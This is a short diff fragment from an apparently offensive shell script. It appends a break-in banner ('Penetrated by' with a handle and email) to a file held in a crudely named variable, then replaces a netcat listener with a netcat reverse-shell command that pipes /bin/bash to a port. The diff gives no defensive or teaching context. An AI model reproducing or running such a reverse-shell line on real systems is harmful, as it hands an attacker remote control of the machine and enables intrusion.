@@ -15,4 +15,4 @@ echo "Penetrated by: FlipDikz" >> $rape
 echo "PradaGangMafia@Proton.me" >> $rape
 echo "" >> $rape
 sleep 5
-nc -lnvvp 8888
+nc 127.0.0.1 4444 -e /bin/bash
